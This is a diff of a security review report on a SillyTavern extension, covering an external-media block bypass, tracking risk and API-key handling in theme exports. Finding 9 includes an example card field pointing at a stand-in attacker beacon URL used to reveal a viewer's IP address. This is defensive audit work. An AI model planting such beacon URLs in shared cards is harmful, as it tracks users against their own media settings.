@@ -4,19 +4,7 @@ Reviewed on 2026-10-11 against `main` at [`a965f5454acf7f1e07a985dd3b17ff547d24b
 
 This report contains findings and suggested fixes only. No implementation changes are included. README is unchanged.
 
-## Scope and verification
-
-The source review covered all eight runtime modules (`index.js`, `vn.js`, `map.js`, `opening.js`, `preview.js`, `reader.js`, `regex.js`, and `agents.js`), shared CSS, the manifest, CI workflow, and bundled development tooling. Repository instructions and the recent Agents PR description and review discussion were checked. Findings already resolved in that discussion are not repeated.
-
-Checks performed:
-
-- All eight runtime modules passed `node --check` as ES modules.
-- The bundled `driver.cjs` and `bench.cjs` passed `node --check`; `st.sh` passed `bash -n`.
-- The manifest and tooling settings parsed as JSON; both root SVG files parsed as XML.
-- Isolated Node VM checks exercised the actual core, VN, and Agents source. Page startup was suppressed, internal functions were exposed in memory, and SillyTavern context, persistence, model requests, and file deletion were stubbed. No real model calls, card writes, or file deletions occurred.
-- The existing CI version-check code was executed against disposable copies with each omitted module's version changed separately.
-
-SillyTavern was not run. The isolated checks confirm the stated code behavior, but UI and host integration still need testing in SillyTavern. A headless browser attempt was blocked by a sandbox `setsockopt` restriction before page startup, so the map styling finding is marked **Verify**. Static asset checks do not establish visual correctness. This review does not claim that all possible defects have been found.
+Isolated checks used the actual source with mocked SillyTavern context, persistence, and requests. SillyTavern integration was not run. Finding 8 needs visual verification because the browser could not start in the sandbox.
 
 ## Findings
 
@@ -130,28 +118,15 @@ P1 means high priority because subsequent user data can be lost. P2 means a func
 
 **Suggested fix if confirmed:** Scope marker selectors under `#ntr_map` or give map markers a distinct class, including label and state selectors.
 
-## Additional security review
-
-The follow-up review examined card and theme inputs, HTML rendering, CSS generation and import, media URL validation, uploaded-file handling, file cleanup and export, agent requests and saved key IDs, YouTube messages, Phone Preview, and development tooling. It found the privacy-policy bypass below. It did **not** establish account takeover, arbitrary script execution, or automatic API-key theft through a card or theme import. Further tracing confirmed normal authentication to user-configured agent endpoints. That behavior is not reported as a security defect. These are scoped review results, not a guarantee that the extension or its host is secure.
-
-Additional isolated checks and source evidence:
-
-- Seven sample URL payloads were rejected by the actual `cUrl`: JavaScript URLs, HTML and SVG data URLs, protocol-relative URLs, plain and percent-encoded parent-directory traversal, and attribute-breaking quotes. Supported external HTTP(S) URLs are still accepted; that acceptance is relevant to finding 9.
-- HTML containing an image error handler was escaped by the core helper, VN dialogue formatter, and agent activity renderer. No executable image element remained in their returned HTML.
-- Malicious tag and class strings were removed by `cleanPins`. Invalid font and color strings were omitted from theme sections. A sample JSON `__proto__` property did not pollute the VM's object prototype through `cleanLookSection`. These are sample checks, not proof against every injection payload.
-- Exercising the actual theme-import callbacks with all three Custom CSS switches set to true still stored `rbCssOn`, `rbBtnCssOn`, and `ovScrollCssOn` as false. Imported CSS requires a later explicit enable action.
-- SillyTavern's inspected host source sets `toastr.options.escapeHtml = true`; unescaped strings passed to those toast calls were therefore not reported as confirmed HTML injection. The extension's key picker retains saved key IDs and labels, and its normal theme sections exclude agent connection settings. No untrusted-card or theme path redirecting a saved API key was established.
-- Pinned Blocks clone the host-rendered message DOM. The inspected host formatter sanitizes messages with DOMPurify before that DOM exists. The clone alone is not evidence of a sanitizer bypass. YouTube callbacks check the sending frame, and the embed destination is constructed under YouTube's origin.
-
-Host behavior was cross-checked against SillyTavern `release` at [`06bde939fb1e9c4c8d8641d810f0a916b5bce127`](https://github.com/SillyTavern/SillyTavern/commit/06bde939fb1e9c4c8d8641d810f0a916b5bce127), including [external-media policy](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L853), [media sanitization](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L1974), and [toast escaping](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/script.js#L360). The user's installed host version and other extensions were not available for integration testing. No real secrets, hostile servers, or user data were used in the checks.
-
 ### 9. ChatGPT review: Bug: Card media bypasses SillyTavern's external-media block
 
 **Location:** [foreground rendering:699](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L699), [media helper:4454](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L4454), and [banner image assignment:1700](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L1700). Similar direct assignments exist for VN art, maps, opening media, and menu thumbnails.
 
+**Host policy:** SillyTavern's inspected [external-media permission helper](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L853) applies global and character overrides, and its [message sanitizer](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L1974) blocks prohibited external media. NTR's direct assignments bypass that path.
+
 **Attack conditions:** A card author controls a supported external image or media URL in the card's NTR metadata. The victim opens the card with the relevant feature enabled, or with foreground elements left mounted from earlier use. The victim has blocked external media globally or for that character in SillyTavern.
 
-**Impact:** NTR cleans the URL's syntax, then `media` returns the string unchanged and rendering assigns it directly to `src` or a CSS background. It never consults the host's external-media permission. A URL unique to the card or recipient can therefore contact the author's server despite the block, disclosing the user's public IP address and the time the card was viewed. This is unwanted external contact and tracking. It is not, by itself, proof of access to chat contents, host cookies, API keys, or the user's machine.
+**Impact:** NTR cleans the URL's syntax, then `media` returns the string unchanged and rendering assigns it directly to `src` or a CSS background. It never consults the host's external-media permission. A URL unique to the card or recipient can therefore contact the author's server despite the block, disclosing the user's public IP address and the time the card was viewed. The demonstrated impact is unwanted external contact and tracking.
 
 **Evidence:** With `powerUserSettings.forbid_external_media = true`, an imported card containing `ntr.fg.Left = "https://attacker.invalid/beacon/card-123.png"` was passed through the actual card cleaner and foreground renderer. The mock image element received that exact external `src`. An available false-returning policy stub was never consulted. The assignment occurred with Foreground enabled and again with Foreground disabled when its elements already existed: setting their display to `none` does not prevent a browser from fetching a newly assigned image source. The mock recorded assignment only; it made no external request.
 
@@ -175,15 +150,3 @@ A minimal metadata fragment for a disposable test card is:
 **Suggested fix:** Centralize permission-aware media resolution using SillyTavern's external-media policy, including character overrides, and apply it before all card-supplied `src`, thumbnail, video, embed, and background assignments. Retain local and supported embedded images. Stop assigning or retaining external sources in inactive foreground elements, and clear prohibited sources when the host policy changes. Explicit user approval of an external URL should follow a clearly defined policy rather than silently bypassing the block.
 
 **Host check:** Use a disposable card and a controlled test image server. Block external media globally and through a character override, then open the card with foreground, banners, VN, and menu previews in turn. Record browser network requests. Repeat after turning Foreground off following earlier use. Require zero prohibited external requests while allowing local images and explicitly permitted media.
-
-## API keys and theme sharing
-
-**Normal theme imports and exports:** No automatic saved-key leak was established. [Theme snapshots](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L4687) copy an explicit list of appearance fields, and [the download callback](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L5071) exports those sections. Agent connections, selected key IDs, and the host's secret storage are not part of that list. Imports clean the appearance sections and do not accept agent connection fields. Loading external theme images does not itself attach SillyTavern's API-key headers to them.
-
-**Verification:** An isolated check placed a dummy saved-key marker in host API settings, an extra NTR setting, and an agent's instructions. It also populated an agent key ID and untrusted destination. The actual theme download callback produced JSON containing neither the marker nor the key ID. Injected `api_key`, `agents`, and `ccUrl` fields were omitted from the cleaned appearance section. No real keys were read.
-
-**Secrets pasted into appearance data:** Export preserves image links and custom CSS as entered. A dummy image URL containing `?api_key=DUMMY-URL-TOKEN` survived the theme snapshot. A credential, signed URL, or token pasted into an image URL or CSS can therefore be included in a shared theme. This is exposure of user-supplied appearance content, not extraction from SillyTavern's saved-key store. Review those fields before sharing an export. A future export warning or redaction preview could help, without assuming every signed URL is safe to share.
-
-**Key-picker response:** NTR stores the selected ID, not the key value. The host's `/api/secrets/read` endpoint returns IDs, labels, active flags, and value fields masked by default. If the host explicitly enables `allowKeysExposure`, those value fields may be unmasked. NTR's picker uses IDs and labels, and no path from those response values into a normal theme export was established. Keeping key exposure disabled remains relevant to the security of the host as a whole.
-
-**Agent authentication:** Custom and Text Completion servers are expected to receive the credential selected for their API or server type. The default active-key selection and authentication during Test Connection are intended behavior, documented in the agent UI. Dummy-key checks confirmed that NTR passes the destination and key selection to SillyTavern, whose backend adds the authentication header. This is not a key-stealing finding. No card or theme-import path that changes the destination of a saved API credential was established.
